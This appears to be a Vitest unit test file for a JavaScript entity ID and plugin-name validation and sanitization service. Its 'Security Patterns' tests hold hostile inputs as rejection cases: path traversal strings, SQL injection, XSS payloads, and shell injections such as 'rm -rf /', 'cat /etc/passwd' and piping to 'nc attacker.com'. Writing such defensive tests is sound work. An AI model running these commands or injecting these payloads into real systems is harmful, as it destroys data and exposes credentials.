import { describe, test, expect, beforeEach, afterEach } from 'vitest';
import { EntitySecurityService } from './entity-security.mjs';
import { ValidationError } from '@thinkeloquent/core-exceptions';

describe('EntitySecurityService', () => {
  let securityService;

  beforeEach(() => {
    securityService = new EntitySecurityService();
  });

  describe('Constructor', () => {
    test('should initialize with default rules', () => {
      const rules = securityService.getRules();

      expect(rules.entityIdPattern).toBeInstanceOf(RegExp);
      expect(rules.pluginNamePattern).toBeInstanceOf(RegExp);
      expect(rules.maxIdLength).toBe(64);
    });

    test('should accept custom rules', () => {
      const customRules = {
        entityIdPattern: /^[a-z]+$/,
        maxIdLength: 32,
        customRule: 'test'
      };

      const customService = new EntitySecurityService(customRules);
      const rules = customService.getRules();

      expect(rules.entityIdPattern).toEqual(/^[a-z]+$/);
      expect(rules.maxIdLength).toBe(32);
      expect(rules.customRule).toBe('test');
      expect(rules.pluginNamePattern).toBeInstanceOf(RegExp); // Default preserved
    });

    test('should merge custom rules with defaults', () => {
      const customService = new EntitySecurityService({ maxIdLength: 128 });
      const rules = customService.getRules();

      expect(rules.maxIdLength).toBe(128);
      expect(rules.entityIdPattern).toBeInstanceOf(RegExp);
      expect(rules.pluginNamePattern).toBeInstanceOf(RegExp);
    });
  });

  describe('validateEntityId', () => {
    test('should accept valid entity IDs', () => {
      const validIds = [
        'entity1',
        'entity-2',
        'entity_3',
        'Entity123',
        'a',
        'A-B_C',
        '123-456'
      ];

      for (const id of validIds) {
        expect(() => securityService.validateEntityId(id)).not.toThrow();
        expect(securityService.validateEntityId(id)).toBe(id);
      }
    });

    test('should reject invalid entity IDs', () => {
      const invalidIds = [
        'entity with spaces',
        'entity@special',
        'entity#hash',
        'entity/slash',
        'entity\\backslash',
        'entity.dot',
        'entity:colon',
        'entity;semicolon'
      ];

      for (const id of invalidIds) {
        expect(() => securityService.validateEntityId(id))
          .toThrow(ValidationError);
      }
    });

    test('should reject empty or non-string values', () => {
      const invalidValues = [
        '',
        null,
        undefined,
        123,
        true,
        [],
        {}
      ];

      for (const value of invalidValues) {
        expect(() => securityService.validateEntityId(value))
          .toThrow(ValidationError);
      }
    });

    test('should reject IDs exceeding maximum length', () => {
      const longId = 'a'.repeat(65);

      expect(() => securityService.validateEntityId(longId))
        .toThrow(ValidationError);

      expect(() => securityService.validateEntityId(longId))
        .toThrow(/exceeds maximum length/);
    });

    test('should use custom entity type in error messages', () => {
      try {
        securityService.validateEntityId('', 'user');
      } catch (error) {
        expect(error.message).toContain('user ID');
      }
    });

    test('should include field and value in ValidationError', () => {
      try {
        securityService.validateEntityId('invalid@id', 'tenant');
      } catch (error) {
        expect(error).toBeInstanceOf(ValidationError);
        expect(error.field).toBe('tenant ID');
        expect(error.value).toBe('invalid@id');
      }
    });
  });

  describe('validatePluginName', () => {
    test('should accept valid plugin names', () => {
      const validNames = [
        'plugin1',
        'plugin-name',
        'plugin_name',
        'MyPlugin',
        'fastify-cors',
        'db-connector-v2'
      ];

      for (const name of validNames) {
        expect(() => securityService.validatePluginName(name)).not.toThrow();
        expect(securityService.validatePluginName(name)).toBe(name);
      }
    });

    test('should reject invalid plugin names', () => {
      const invalidNames = [
        'plugin.name',
        'plugin/name',
        'plugin name',
        '@scope/plugin',
        'plugin:name',
        '../malicious'
      ];

      for (const name of invalidNames) {
        expect(() => securityService.validatePluginName(name))
          .toThrow(ValidationError);
      }
    });

    test('should reject empty plugin names', () => {
      expect(() => securityService.validatePluginName(''))
        .toThrow('Plugin name must be a non-empty string');
    });

    test('should reject non-string plugin names', () => {
      expect(() => securityService.validatePluginName(123))
        .toThrow(ValidationError);

      expect(() => securityService.validatePluginName(null))
        .toThrow(ValidationError);
    });
  });

  describe('validate (generic)', () => {
    test('should validate against custom patterns', () => {
      const pattern = /^[0-9]+$/;

      expect(securityService.validate('123', 'Number field', pattern)).toBe('123');

      expect(() => securityService.validate('abc', 'Number field', pattern))
        .toThrow('Number field contains invalid characters');
    });

    test('should include all validation checks', () => {
      const pattern = /^[a-z]+$/;

      // Empty check
      expect(() => securityService.validate('', 'Field', pattern))
        .toThrow('Field must be a non-empty string');

      // Type check
      expect(() => securityService.validate(123, 'Field', pattern))
        .toThrow('Field must be a non-empty string');

      // Length check
      const longValue = 'a'.repeat(65);
      expect(() => securityService.validate(longValue, 'Field', pattern))
        .toThrow('Field exceeds maximum length');

      // Pattern check
      expect(() => securityService.validate('ABC', 'Field', pattern))
        .toThrow('Field contains invalid characters');
    });
  });

  describe('validateEntitySecurity', () => {
    test('should pass when no security requirements', () => {
      const entityConfig = {};
      const request = {};

      expect(securityService.validateEntitySecurity('user', entityConfig, request))
        .toBe(true);
    });

    test('should enforce authentication requirement', () => {
      const entityConfig = {
        security: {
          authentication: 'required'
        }
      };

      // Should pass with authentication
      const authRequest = { authenticated: true };
      expect(securityService.validateEntitySecurity('user', entityConfig, authRequest))
        .toBe(true);

      // Should fail without authentication
      const noAuthRequest = { authenticated: false };
      expect(() => securityService.validateEntitySecurity('user', entityConfig, noAuthRequest))
        .toThrow('Authentication required for user');
    });

    test('should enforce strict isolation', () => {
      const entityConfig = {
        security: {
          isolation: 'strict'
        }
      };

      // Should pass without cross-entity access
      const normalRequest = { crossEntityAccess: false };
      expect(securityService.validateEntitySecurity('tenant', entityConfig, normalRequest))
        .toBe(true);

      // Should fail with cross-entity access
      const crossRequest = { crossEntityAccess: true };
      expect(() => securityService.validateEntitySecurity('tenant', entityConfig, crossRequest))
        .toThrow('Cross-entity access denied for tenant');
    });

    test('should enforce multiple security requirements', () => {
      const entityConfig = {
        security: {
          authentication: 'required',
          isolation: 'strict'
        }
      };

      // Should pass with all requirements met
      const validRequest = {
        authenticated: true,
        crossEntityAccess: false
      };
      expect(securityService.validateEntitySecurity('secure', entityConfig, validRequest))
        .toBe(true);

      // Should fail if any requirement not met
      const invalidRequest1 = {
        authenticated: false,
        crossEntityAccess: false
      };
      expect(() => securityService.validateEntitySecurity('secure', entityConfig, invalidRequest1))
        .toThrow(ValidationError);

      const invalidRequest2 = {
        authenticated: true,
        crossEntityAccess: true
      };
      expect(() => securityService.validateEntitySecurity('secure', entityConfig, invalidRequest2))
        .toThrow(ValidationError);
    });
  });

  describe('isValidEntityId', () => {
    test('should return true for valid entity IDs', () => {
      expect(securityService.isValidEntityId('valid-id')).toBe(true);
      expect(securityService.isValidEntityId('entity_123')).toBe(true);
      expect(securityService.isValidEntityId('Entity-Name')).toBe(true);
    });

    test('should return false for invalid entity IDs', () => {
      expect(securityService.isValidEntityId('invalid id')).toBe(false);
      expect(securityService.isValidEntityId('invalid@id')).toBe(false);
      expect(securityService.isValidEntityId('')).toBe(false);
      expect(securityService.isValidEntityId(null)).toBe(false);
      expect(securityService.isValidEntityId(123)).toBe(false);
    });

    test('should not throw errors', () => {
      expect(() => securityService.isValidEntityId('any value')).not.toThrow();
      expect(() => securityService.isValidEntityId(null)).not.toThrow();
      expect(() => securityService.isValidEntityId(undefined)).not.toThrow();
    });
  });

  describe('isValidPluginName', () => {
    test('should return true for valid plugin names', () => {
      expect(securityService.isValidPluginName('plugin-name')).toBe(true);
      expect(securityService.isValidPluginName('plugin_name')).toBe(true);
      expect(securityService.isValidPluginName('Plugin123')).toBe(true);
    });

    test('should return false for invalid plugin names', () => {
      expect(securityService.isValidPluginName('plugin.name')).toBe(false);
      expect(securityService.isValidPluginName('plugin/name')).toBe(false);
      expect(securityService.isValidPluginName('')).toBe(false);
      expect(securityService.isValidPluginName(null)).toBe(false);
    });

    test('should not throw errors', () => {
      expect(() => securityService.isValidPluginName('../../etc/passwd')).not.toThrow();
      expect(() => securityService.isValidPluginName({})).not.toThrow();
    });
  });

  describe('sanitizeEntityId', () => {
    test('should sanitize invalid characters', () => {
      expect(securityService.sanitizeEntityId('entity name')).toBe('entity-name');
      expect(securityService.sanitizeEntityId('entity@special#chars')).toBe('entity-special-chars');
      expect(securityService.sanitizeEntityId('entity/path\\to\\file')).toBe('entity-path-to-file');
      expect(securityService.sanitizeEntityId('entity.with.dots')).toBe('entity-with-dots');
    });

    test('should preserve valid characters', () => {
      expect(securityService.sanitizeEntityId('valid-entity_123')).toBe('valid-entity_123');
      expect(securityService.sanitizeEntityId('EntityName')).toBe('EntityName');
      expect(securityService.sanitizeEntityId('a-b_c')).toBe('a-b_c');
    });

    test('should remove consecutive hyphens', () => {
      expect(securityService.sanitizeEntityId('entity---name')).toBe('entity-name');
      expect(securityService.sanitizeEntityId('entity@@@@name')).toBe('entity-name');
      expect(securityService.sanitizeEntityId('a------b')).toBe('a-b');
    });

    test('should remove leading and trailing hyphens', () => {
      expect(securityService.sanitizeEntityId('---entity---')).toBe('entity');
      expect(securityService.sanitizeEntityId('@entity@')).toBe('entity');
      expect(securityService.sanitizeEntityId('...entity...')).toBe('entity');
    });

    test('should truncate long IDs', () => {
      const longId = 'a'.repeat(100);
      const sanitized = securityService.sanitizeEntityId(longId);

      expect(sanitized.length).toBe(64);
      expect(sanitized).toBe('a'.repeat(64));
    });

    test('should handle edge cases', () => {
      expect(securityService.sanitizeEntityId('')).toBe(null);
      expect(securityService.sanitizeEntityId(null)).toBe(null);
      expect(securityService.sanitizeEntityId(undefined)).toBe(null);
      expect(securityService.sanitizeEntityId(123)).toBe(null);
      expect(securityService.sanitizeEntityId('---')).toBe(null);
      expect(securityService.sanitizeEntityId('...')).toBe(null);
      expect(securityService.sanitizeEntityId('@@@')).toBe(null);
    });

    test('should handle Unicode and special characters', () => {
      expect(securityService.sanitizeEntityId('café-résumé')).toBe('caf-r-sum');
      expect(securityService.sanitizeEntityId('日本語')).toBe(null);
      expect(securityService.sanitizeEntityId('emoji-🚀-test')).toBe('emoji-test');
      expect(securityService.sanitizeEntityId('tab\tand\nnewline')).toBe('tab-and-newline');
    });

    test('should work with custom max length', () => {
      const customService = new EntitySecurityService({ maxIdLength: 10 });
      const longId = 'a'.repeat(20);

      expect(customService.sanitizeEntityId(longId)).toBe('a'.repeat(10));
    });
  });

  describe('getRules', () => {
    test('should return a copy of rules', () => {
      const rules1 = securityService.getRules();
      const rules2 = securityService.getRules();

      expect(rules1).not.toBe(rules2); // Different objects
      expect(rules1).toEqual(rules2); // Same content
    });

    test('should not allow external modification', () => {
      const rules = securityService.getRules();
      rules.maxIdLength = 999;

      expect(securityService.getRules().maxIdLength).toBe(64);
    });
  });

  describe('updateRules', () => {
    test('should update existing rules', () => {
      const newRules = {
        maxIdLength: 128,
        entityIdPattern: /^[a-z]+$/
      };

      const updated = securityService.updateRules(newRules);

      expect(updated.maxIdLength).toBe(128);
      expect(updated.entityIdPattern).toEqual(/^[a-z]+$/);
      expect(updated.pluginNamePattern).toBeInstanceOf(RegExp); // Preserved
    });

    test('should add new rules', () => {
      const newRules = {
        customPattern: /^custom$/,
        customLength: 256
      };

      const updated = securityService.updateRules(newRules);

      expect(updated.customPattern).toEqual(/^custom$/);
      expect(updated.customLength).toBe(256);
      expect(updated.maxIdLength).toBe(64); // Original preserved
    });

    test('should affect subsequent validations', () => {
      // Original should pass
      expect(securityService.validateEntityId('entity-123')).toBe('entity-123');

      // Update to more restrictive pattern
      securityService.updateRules({
        entityIdPattern: /^[a-z]+$/
      });

      // Now should fail
      expect(() => securityService.validateEntityId('entity-123'))
        .toThrow(ValidationError);

      // But this should pass
      expect(securityService.validateEntityId('entity')).toBe('entity');
    });

    test('should return the updated rules', () => {
      const result = securityService.updateRules({ maxIdLength: 32 });

      expect(result).toEqual(securityService.getRules());
      expect(result.maxIdLength).toBe(32);
    });
  });

  describe('Security Patterns', () => {
    test('should reject path traversal attempts', () => {
      const maliciousIds = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32',
        'entity/../admin',
        './hidden/file'
      ];

      for (const id of maliciousIds) {
        expect(securityService.isValidEntityId(id)).toBe(false);
        expect(securityService.isValidPluginName(id)).toBe(false);
      }
    });

    test('should reject SQL injection attempts', () => {
      const sqlInjections = [
        "entity'; DROP TABLE users; --",
        "entity' OR '1'='1",
        'entity"; DELETE FROM data; --'
      ];

      for (const injection of sqlInjections) {
        expect(securityService.isValidEntityId(injection)).toBe(false);
        const sanitized = securityService.sanitizeEntityId(injection);
        // The sanitizer removes special characters used in SQL injection
        expect(sanitized).not.toContain("'");
        expect(sanitized).not.toContain('"');
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('--');
      }
    });

    test('should reject XSS attempts', () => {
      const xssAttempts = [
        '<script>alert("XSS")</script>',
        'entity<img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        'entity&lt;script&gt;'
      ];

      for (const xss of xssAttempts) {
        expect(securityService.isValidEntityId(xss)).toBe(false);
        const sanitized = securityService.sanitizeEntityId(xss);
        // The sanitizer removes special characters used in XSS
        expect(sanitized).not.toContain('<');
        expect(sanitized).not.toContain('>');
        expect(sanitized).not.toContain('(');
        expect(sanitized).not.toContain(')');
        expect(sanitized).not.toContain(':');
      }
    });

    test('should reject command injection attempts', () => {
      const commandInjections = [
        'entity; rm -rf /',
        'entity && cat /etc/passwd',
        'entity | nc attacker.com 1234',
        'entity`whoami`'
      ];

      for (const cmd of commandInjections) {
        expect(securityService.isValidEntityId(cmd)).toBe(false);
        const sanitized = securityService.sanitizeEntityId(cmd);
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('&&');
        expect(sanitized).not.toContain('|');
        expect(sanitized).not.toContain('`');
      }
    });
  });

  describe('Performance', () => {
    test('should handle validation of many IDs efficiently', () => {
      const start = performance.now();

      for (let i = 0; i < 10000; i++) {
        securityService.isValidEntityId(`entity-${i}`);
      }

      const duration = performance.now() - start;
      expect(duration).toBeLessThan(100); // Should complete in under 100ms
    });

    test('should handle sanitization of complex strings efficiently', () => {
      const complexString = '!@#$%^&*()_+{}|:"<>?[]\\;\',./' + 'a'.repeat(100);
      const start = performance.now();

      for (let i = 0; i < 1000; i++) {
        securityService.sanitizeEntityId(complexString);
      }

      const duration = performance.now() - start;
      expect(duration).toBeLessThan(100);
    });
  });

  describe('Edge Cases', () => {
    test('should handle very short valid IDs', () => {
      expect(securityService.validateEntityId('a')).toBe('a');
      expect(securityService.validateEntityId('1')).toBe('1');
      expect(securityService.validateEntityId('_')).toBe('_');
      expect(securityService.validateEntityId('-')).toBe('-');
    });

    test('should handle IDs at exact max length', () => {
      const exactLength = 'a'.repeat(64);
      expect(securityService.validateEntityId(exactLength)).toBe(exactLength);

      const overLength = 'a'.repeat(65);
      expect(() => securityService.validateEntityId(overLength)).toThrow();
    });

    test('should handle mixed case consistently', () => {
      expect(securityService.validateEntityId('AbCdEf')).toBe('AbCdEf');
      expect(securityService.validateEntityId('UPPERCASE')).toBe('UPPERCASE');
      expect(securityService.validateEntityId('lowercase')).toBe('lowercase');
      expect(securityService.validateEntityId('MiXeD-CaSe_123')).toBe('MiXeD-CaSe_123');
    });

    test('should handle numeric-only IDs', () => {
      expect(securityService.validateEntityId('123')).toBe('123');
      expect(securityService.validateEntityId('000')).toBe('000');
      expect(securityService.validateEntityId('999999')).toBe('999999');
    });
  });
});